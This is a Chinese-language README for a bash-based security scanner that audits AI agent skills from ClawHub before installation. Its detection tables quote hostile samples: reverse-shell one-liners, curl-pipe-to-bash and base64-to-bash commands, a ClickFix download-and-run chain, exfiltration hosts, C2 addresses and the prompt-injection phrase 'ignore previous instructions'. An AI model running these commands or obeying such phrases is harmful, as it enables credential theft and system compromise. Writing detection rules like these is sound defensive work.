---
name: skillvet
version: 2.0.8
description: "**ClawHub/社区技能的安全扫描工具**  
该工具能够在您安装技能之前检测恶意软件、凭证窃取、数据泄露、命令注入、代码混淆、同形异义词攻击（homograph attacks）、ANSI编码攻击以及特定类型的攻击模式等安全风险。适用于从ClawHub或任何公共市场安装技能时，也可用于审查第三方代理技能的安全性，或在将代码提供给AI代理之前对其进行安全验证。  

**触发条件：**  
- 安装技能  
- 审计技能  
- 检查技能  
- 验证技能安全性  
- 安全安装  
- 询问该技能是否安全  

**使用场景：**  
- 在从ClawHub或第三方市场安装技能时  
- 在使用第三方代理技能之前  
- 在将代码提供给AI代理之前  

**主要功能：**  
- 检测恶意软件  
- 防止凭证被盗  
- 防止数据泄露  
- 防止命令注入攻击  
- 识别代码混淆行为  
- 识别同形异义词攻击  
- 检测特定类型的攻击模式  

**建议使用场景：**  
- 当您不确定技能的来源或安全性时  
- 在使用可能包含安全风险的第三方工具或代码时  

**注意事项：**  
- 请确保在安装任何技能之前使用该工具进行安全扫描  
- 定期更新该工具以获取最新的安全威胁信息  

**总结：**  
该安全扫描工具为ClawHub/社区技能提供了强大的安全保障，帮助您避免潜在的安全风险，确保您的AI系统免受攻击。"
---

# Skillvet

这是一个用于检测代理技能安全性的扫描工具，包含48项关键检查项和8项警告检查项。该工具完全依赖bash和grep命令，无需额外依赖库。它采用了多种检测模式，包括[Tirith](https://www.koi.ai/blog/clawhavoc-341-malicious-clawedbot-skills-found-by-the-bot-they-were-targeting)、[Bitdefender](https://businessinsights.bitdefender.com/technical-advisory-openclaw-exploitation-enterprise-networks)、[Snyk](https://snyk.io/articles/clawdhub-malicious-campaign-ai-agent-skills/)和[1Password](https://1password.com/blog/from-magic-to-malware-how-openclaws-agent-skills-become-an-attack-surface)等安全机构的检测规则。

## 使用方法

### 安全安装（包含审计功能，发现严重问题时会自动删除相关文件）：

```bash
bash skills/skillvet/scripts/safe-install.sh <skill-slug>
```

### 审计现有技能：

```bash
bash skills/skillvet/scripts/skill-audit.sh skills/some-skill
```

### 审计所有已安装的技能：

```bash
for d in skills/*/; do bash skills/skillvet/scripts/skill-audit.sh "$d"; done
```

### JSON格式输出（适用于自动化脚本）：

```bash
bash skills/skillvet/scripts/skill-audit.sh --json skills/some-skill
```

### SARIF格式输出（适用于GitHub代码扫描或VS Code）：

```bash
bash skills/skillvet/scripts/skill-audit.sh --sarif skills/some-skill
```

### 摘要模式（每项技能仅显示一行结果）：

```bash
bash skills/skillvet/scripts/skill-audit.sh --summary skills/some-skill
```

### 详细模式（显示执行的检查项及扫描的文件）：

```bash
bash skills/skillvet/scripts/skill-audit.sh --verbose skills/some-skill
```

### 在不安装的情况下扫描远程技能：

```bash
bash skills/skillvet/scripts/scan-remote.sh <skill-slug>
```

### 差异扫描（仅扫描文件版本间的变化）：

```bash
bash skills/skillvet/scripts/diff-scan.sh path/to/old-version path/to/new-version
```

### 出错代码：
- `0`：扫描完成，无问题；
- `1`：仅发现警告；
- `2`：发现严重安全问题。

### 高级选项

| 选项 | 描述 |
|------|-------------|
| `--json` | 生成JSON格式的输出，适用于持续集成（CI）或仪表盘展示 |
| `--sarif` | 生成SARIF v2.1.0格式的输出，适用于GitHub代码扫描 |
| `--summary` | 每项技能仅显示一行摘要信息 |
| `--verbose` | 显示执行的检查项及扫描的文件 |
| `--exclude-self` | 扫描时跳过当前目录 |
| `--max-file-size N` | 跳过大于N字节的文件 |
| `--max-depth N` | 限制目录遍历深度 |

### 遮免误报

- 可在技能目录下创建`.skillvetrc`文件来禁用特定的检查项；
- 也可以在代码中添加注释来直接屏蔽某些检查项。

### 提交前钩子

可以通过设置git提交前钩子，在提交代码前自动执行技能扫描。

### 风险评分

每个安全问题都有一个严重性等级（1-10分）。总风险评分会包含在JSON、SARIF和摘要输出中。评分越高，表示问题越严重：
- **10分**：反向shell、已知的C2服务器地址；
- **9分**：数据泄露、通过管道传输数据、持久化攻击、ClickFix漏洞、Base64编码的恶意代码执行；
- **7-8分**：凭证窃取、代码混淆、路径遍历、定时炸弹攻击；
- **4-6分**：使用punycode编码、混淆字符、ANSI转义序列、缩短的URL；
- **2-3分**：子进程执行、网络请求、文件写入操作。

### 关键检查项（自动阻止执行）

### 核心安全检查（共24项）：

| 编号 | 检查项 | 例子 |
|---|-------|---------|
| 1 | 已知的数据泄露入口点 | `webhook.site`, `ngrok.io`, `requestbin` |
| 2 | 大量环境变量收集 | `printenv \|`, `${!*@}` |
| 3 | 未授权访问外部凭证 | 脚本中包含`ANTHROPIC_API_KEY`, `TELEGRAM_BOT_TOKEN` |
| 4 | 代码混淆 | 使用Base64解码、十六进制转义、动态生成代码 |
| 5 | 路径遍历/访问敏感文件 | `../../`, `~/.ssh`, `~/.clawdbot` |
| 6 | 通过curl/wget传输数据 | `curl --data`, `wget --post` |
| 7 | 使用反向shell或bind shell | `/dev/tcp/`, `nc -e`, `socat` |
| 8 | 篡改`.env`文件 | 脚本中加载`.env`文件（非文档部分） |
| 9 | 在Markdown中注入提示信息 | `SKILL.md`文件中包含“忽略之前的指令” |
| 10 | 利用大型语言模型（LLM）工具 | 指令用于发送或发送密码 |
| 11 | 篡改代理配置文件 | 修改`AGENTS.md`, `SOUL.md`, `clawdbot.json` |
| 12 | Unicode编码混淆 | 使用零宽度字符、RTL控制字符进行混淆 |
| 13 | 疑似危险的设置命令 | 在`SKILL.md`中使用curl和pip |
| 14 | 社交工程攻击 | 下载外部二进制文件、提供即用型攻击指令 |
| 15 | 配置文件中包含`.env`文件 | 技能文件中包含`.env`文件（而非示例文件） |
| 16 | 混淆URL（Tirith模式） | 主机名中使用西里尔字母和拉丁字母的相似字符 |
| 17 | ANSI转义序列（Tirith模式） | 代码/数据文件中包含终端转义序列 |
| 18 | 使用punycode编码的域名（Tirith模式） | 域名前缀为`xn--` |
| 19 | 双重编码的路径（Tirith模式） | 使用`%25XX`进行百分比编码绕过 |
| 20 | 缩短的URL（Tirith模式） | 使用`bit.ly`, `t.co`, `tinyurl.com`隐藏实际目标地址 |
| 21 | 通过管道执行shell命令 | `curl \| bash`（HTTP和HTTPS） |
| 22 | 代码构造技巧 | 使用`String.fromCharCode`, `getattr`, `dynamic call assembly`进行混淆 |
| 23 | 数据流链分析 | 从同一文件读取数据、进行编码后发送网络请求 |
| 24 | 定时炸弹攻击 | `Date.now() > timestamp`, `setTimeout(fn, 86400000)` |
| 25 | 已知的C2/IOC服务器地址 | `91.92.242.30`, `54.91.154.110`（已知的AMOS攻击服务器） |
| 26 | 使用密码保护的压缩文件 | “使用密码解压：openclaw”用于规避安全检测 |
| 27 | 通过Paste服务上传恶意脚本 | `glot.io`, `pastebin.com`托管恶意脚本 |
| 28 | GitHub发布的二进制文件 | 在GitHub上发布带有`.zip`/`.exe`文件的虚假依赖项 |
| 29 | 使用Base64编码传递给解释器 | `echo '...' \| base64 -D \| bash`（macOS的主要攻击方式） |
| 30 | 子进程与网络请求结合 | Python/JS代码中隐藏的管道连接 |
| 31 | 假冒的依赖项链接（警告） | 使用虚假的依赖项链接引导用户下载恶意文件 |
| 32 | 进程持久化与网络攻击 | `nohup curl ... &`实现后门连接 |
| 33 | 假冒的依赖项要求 | “依赖项”部分包含可疑的外部下载链接 |
| 34 | 使用`xattr/chmod`进行攻击 | 绕过macOS的Gatekeeper安全机制 |
| 35 | ClickFix攻击链 | `curl -o /tmp/x && chmod +x && ./x`, `open -a` |
| 36 | 可疑的包来源 | 从非官方仓库安装依赖项（如`openclaw-core`, `some-lib`） |
| 37 | 模拟操作系统更新攻击 | “需要安装Apple Software Update” |
| 38 | 已知的恶意ClawHub攻击者 | `zaycv`, `Ddoy233`, `Sakaen736jih`, `Hightower6eu` |
| 39 | 使用`/dev/tcp`进行反向shell攻击 | `bash -i >/dev/tcp/IP/PORT 0>&1` |
| 40 | 使用`nohup`创建后门 | `nohup bash -c '...' >/dev/null` |
| 41 | 使用Python的反向shell | `socket.connect` + `dup2`, `pty.spawn('/bin/bash')` |
| 42 | 伪装终端输出 | 在恶意代码前显示“正在下载...”的提示信息 |
| 43 | 访问凭证文件 | 直接读取`.env`, `.pem`, `.aws/credentials`文件 |
| 44 | 在`TMPDIR`中临时存放恶意文件 | 将恶意文件存储在`TMPDIR`后执行 |
| 45 | 在GitHub上执行原始代码 | `curl raw.githubusercontent.com/... \| bash` |
| 46 | 使用echo编码的payload | 长Base64字符串被解码后传递给解码器 |
| 48 | 抄写技能名称（如`clawdhub-helper`, `openclaw-cli`, `skillvet1`） |

### 警告检查项（需要人工审核）

| 编号 | 检查项 | 例子 |
|---|-------|---------|
| W1 | 未知的外部工具要求 | 安装说明中包含非标准的CLI工具 |
| W2 | 使用子进程 | `child_process`, `execSync`, `spawn`, `subprocess` |
| W3 | 发送网络请求 | `axios`, `fetch`, `requests` |
| W4 | 文件被压缩/打包 | 文件首行超过500个字符，无法进行审计 |
| W5 | 文件系统写操作 | `writeFile`, `open('w)', `fs.append` |
| W6 | 不安全的传输方式 | `curl -k`, `verify=False`（禁用了TLS加密） |
| W7 | 使用不受信任的Docker镜像源 |

### 支持的文件类型

`.md`, `.js`, `.ts`, `.tsx`, `.jsx`, `.py`, `.sh`, `.bash`, `.rs`, `.go`, `.rb`, `.c`, `.cpp`, `.json`, `.yaml`, `.yml`, `.toml`, `.txt`, `.env*`, `Dockerfile*`, `Makefile`, `pom.xml`, `gradle`。

**注意**：二进制文件会被自动跳过。符号链接也会被扫描。

### 兼容性

该工具支持Linux和macOS系统。对于需要使用正则表达式的检查（如#12, #16, #17），会优先使用`grep -P`；在没有Perl的系统中（如macOS），则会使用`perl`作为替代方案。如果这两种方法都不可用，这些检查项将被忽略。

### IOC（Indicators of Compromise）更新

检查项#25中的C2服务器地址列表基于以下来源更新：
- [Koi Security的报告](https://www.koi.ai/blog/clawhavoc-341-malicious-clawedbot-skills-found-by-the-bot-they-were-targeting)（2026年2月）
- [The Hacker News的报道](https://thehackernews.com/2026/02/researchers-find-341-malicious-clawhub.html)
- [OpenSourceMalware的分析](https://opensourcemalware.com/blog/clawdbot-skills-ganked-your-crypto)

要更新IOC列表，请编辑`scripts/patterns.b64`文件中的`KNOWN_IPS`部分（该文件使用Base64编码的正则表达式）。

### 持续集成/持续交付（CI/CD）集成

提供了`.github/workflows/test.yml`文件，可在推送代码或创建Pull Request时在Ubuntu和macOS上自动运行测试。

### GitHub代码扫描（使用SARIF格式）

```yaml
- name: Run skillvet
  run: bash scripts/skill-audit.sh --sarif skills/some-skill > results.sarif || true

- name: Upload SARIF
  uses: github/codeql-action/upload-sarif@v3
  with:
    sarif_file: results.sarif
```

### 注意事项

- 该工具仅进行静态分析，对基于英文的提示信息进行检测；
- 对压缩后的JavaScript代码会进行标记，但不会对其进行反编译；
- 清洁扫描虽然能提高安全性，但不能保证100%的安全性；
- 扫描工具本身会显示其检测到的问题（因为其检测规则中包含这些字符串）。在持续集成（CI）过程中，可以使用`--exclude-self`选项跳过自我扫描。